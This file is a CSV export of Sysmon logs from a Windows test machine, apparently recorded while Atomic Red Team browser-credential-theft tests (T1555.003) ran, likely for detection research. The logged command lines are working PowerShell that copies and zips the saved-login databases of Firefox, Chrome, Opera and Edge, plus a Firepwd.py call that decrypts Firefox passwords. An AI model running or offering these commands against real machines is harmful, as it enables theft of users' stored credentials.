Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$exfil_folder = \""""$env:temp\T1555.003\""""
if (test-path \""""$exfil_folder\"""") {} else {new-item -path \""""$env:temp\"""" -Name \""""T1555.003\"""" -ItemType \""""directory\"""" -force}
$FirefoxCredsLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
if (test-path \""""$FirefoxCredsLocation\key4.db\"""") {copy-item \""""$FirefoxCredsLocation\key4.db\"""" -destination \""""$exfil_folder\T1555.003Firefox_key4.db\""""} else {}
if (test-path \""""$FirefoxCredsLocation\logins.json\"""") {copy-item \""""$FirefoxCredsLocation\logins.json\"""" -destination \""""$exfil_folder\T1555.003Firefox_logins.json\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data For Account\""""} else {}
if (test-path \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""") {copy-item \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""" -destination \""""$exfil_folder\T1555.003Opera_Login Data\""""} else {}
if (test-path \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""") {copy-item \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""" -destination \""""$exfil_folder\T1555.003Edge_Login Data\""""} else {} 
compress-archive -path \""""$exfil_folder\"""" -destinationpath \""""$exfil_folder.zip\"""" -force}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9478,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:23.971

ProcessGuid: {fda94052-41d3-658d-7c02-000000000b00}

ProcessId: 8764

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$exfil_folder = \""""$env:temp\T1555.003\""""
if (test-path \""""$exfil_folder\"""") {} else {new-item -path \""""$env:temp\"""" -Name \""""T1555.003\"""" -ItemType \""""directory\"""" -force}
$FirefoxCredsLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
if (test-path \""""$FirefoxCredsLocation\key4.db\"""") {copy-item \""""$FirefoxCredsLocation\key4.db\"""" -destination \""""$exfil_folder\T1555.003Firefox_key4.db\""""} else {}
if (test-path \""""$FirefoxCredsLocation\logins.json\"""") {copy-item \""""$FirefoxCredsLocation\logins.json\"""" -destination \""""$exfil_folder\T1555.003Firefox_logins.json\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data For Account\""""} else {}
if (test-path \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""") {copy-item \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""" -destination \""""$exfil_folder\T1555.003Opera_Login Data\""""} else {}
if (test-path \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""") {copy-item \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""" -destination \""""$exfil_folder\T1555.003Edge_Login Data\""""} else {} 
compress-archive -path \""""$exfil_folder\"""" -destinationpath \""""$exfil_folder.zip\"""" -force}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-41d3-658d-7c02-000000000b00},7044,8764,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:37:23.9728174Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:23.971,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:23.9728174Z""/>
      <EventRecordID>9478</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:23.971</Data>
      <Data Name=""ProcessGuid"">{fda94052-41d3-658d-7c02-000000000b00}</Data>
      <Data Name=""ProcessId"">8764</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$exfil_folder = \""""$env:temp\T1555.003\""""
if (test-path \""""$exfil_folder\"""") {} else {new-item -path \""""$env:temp\"""" -Name \""""T1555.003\"""" -ItemType \""""directory\"""" -force}
$FirefoxCredsLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
if (test-path \""""$FirefoxCredsLocation\key4.db\"""") {copy-item \""""$FirefoxCredsLocation\key4.db\"""" -destination \""""$exfil_folder\T1555.003Firefox_key4.db\""""} else {}
if (test-path \""""$FirefoxCredsLocation\logins.json\"""") {copy-item \""""$FirefoxCredsLocation\logins.json\"""" -destination \""""$exfil_folder\T1555.003Firefox_logins.json\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data For Account\""""} else {}
if (test-path \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""") {copy-item \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""" -destination \""""$exfil_folder\T1555.003Opera_Login Data\""""} else {}
if (test-path \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""") {copy-item \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""" -destination \""""$exfil_folder\T1555.003Edge_Login Data\""""} else {} 
compress-archive -path \""""$exfil_folder\"""" -destinationpath \""""$exfil_folder.zip\"""" -force}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:23.971

ProcessGuid: {fda94052-41d3-658d-7c02-000000000b00}

ProcessId: 8764

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$exfil_folder = \""""$env:temp\T1555.003\""""
if (test-path \""""$exfil_folder\"""") {} else {new-item -path \""""$env:temp\"""" -Name \""""T1555.003\"""" -ItemType \""""directory\"""" -force}
$FirefoxCredsLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
if (test-path \""""$FirefoxCredsLocation\key4.db\"""") {copy-item \""""$FirefoxCredsLocation\key4.db\"""" -destination \""""$exfil_folder\T1555.003Firefox_key4.db\""""} else {}
if (test-path \""""$FirefoxCredsLocation\logins.json\"""") {copy-item \""""$FirefoxCredsLocation\logins.json\"""" -destination \""""$exfil_folder\T1555.003Firefox_logins.json\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data For Account\""""} else {}
if (test-path \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""") {copy-item \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""" -destination \""""$exfil_folder\T1555.003Opera_Login Data\""""} else {}
if (test-path \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""") {copy-item \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""" -destination \""""$exfil_folder\T1555.003Edge_Login Data\""""} else {} 
compress-archive -path \""""$exfil_folder\"""" -destinationpath \""""$exfil_folder.zip\"""" -force}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,,1,9477,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:23.705

ProcessGuid: {fda94052-41d3-658d-7b02-000000000b00}

ProcessId: 8588

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-41d1-658d-7902-000000000b00}

ParentProcessId: 4828

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt}

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""powershell.exe"" & {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-41d1-658d-7902-000000000b00},4828,WINDEV2309EVAL\User,{fda94052-41d3-658d-7b02-000000000b00},7044,8588,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:37:23.7065033Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:23.705,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:23.7065033Z""/>
      <EventRecordID>9477</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:23.705</Data>
      <Data Name=""ProcessGuid"">{fda94052-41d3-658d-7b02-000000000b00}</Data>
      <Data Name=""ProcessId"">8588</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-41d1-658d-7902-000000000b00}</Data>
      <Data Name=""ParentProcessId"">4828</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation &gt; $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:23.705

ProcessGuid: {fda94052-41d3-658d-7b02-000000000b00}

ProcessId: 8588

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-41d1-658d-7902-000000000b00}

ParentProcessId: 4828

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation &gt; $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:37:22.121,,,,,,,,,11,9476,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:37:22.121

ProcessGuid: {fda94052-41d1-658d-7902-000000000b00}

ProcessId: 4828

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_viloq1n2.s12.ps1

CreationUtcTime: 2023-12-28 09:37:22.121

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-41d1-658d-7902-000000000b00},7044,4828,,,,,,"
      ",-,,,,,,2023-12-28T09:37:22.1227192Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_viloq1n2.s12.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:22.121,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:22.1227192Z""/>
      <EventRecordID>9476</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:22.121</Data>
      <Data Name=""ProcessGuid"">{fda94052-41d1-658d-7902-000000000b00}</Data>
      <Data Name=""ProcessId"">4828</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_viloq1n2.s12.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:37:22.121</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:37:22.121

ProcessGuid: {fda94052-41d1-658d-7902-000000000b00}

ProcessId: 4828

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_viloq1n2.s12.ps1

CreationUtcTime: 2023-12-28 09:37:22.121

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9475,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:21.983

ProcessGuid: {fda94052-41d1-658d-7902-000000000b00}

ProcessId: 4828

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-41d1-658d-7902-000000000b00},7044,4828,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:37:21.9851978Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:21.983,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:21.9851978Z""/>
      <EventRecordID>9475</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:21.983</Data>
      <Data Name=""ProcessGuid"">{fda94052-41d1-658d-7902-000000000b00}</Data>
      <Data Name=""ProcessId"">4828</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation &gt; $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:21.983

ProcessGuid: {fda94052-41d1-658d-7902-000000000b00}

ProcessId: 4828

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation &gt; $env:temp\T1555.003Test8.txt
